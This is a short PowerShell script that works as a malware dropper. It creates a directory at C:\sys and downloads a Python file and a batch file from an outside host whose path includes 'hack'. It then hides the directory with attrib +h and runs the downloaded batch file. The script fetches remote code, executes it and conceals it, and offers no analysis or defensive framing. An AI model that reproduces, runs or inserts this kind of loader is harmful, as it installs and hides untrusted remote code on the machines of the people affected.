$dir = "C:\sys"

if (-not (Test-Path $dir)) {
    New-Item -ItemType Directory -Path $dir | Out-Null
}

Invoke-WebRequest "https://sniff.phamtheteam.com/public/hack/home/main.py" -OutFile "C:\sys\sys.py"
Invoke-WebRequest "https://sniff.phamtheteam.com/public/hack/home/sys.bat" -OutFile "C:\sys\sys.bat"

attrib +h "C:\sys"

Start-Process "C:\sys\sys.bat"
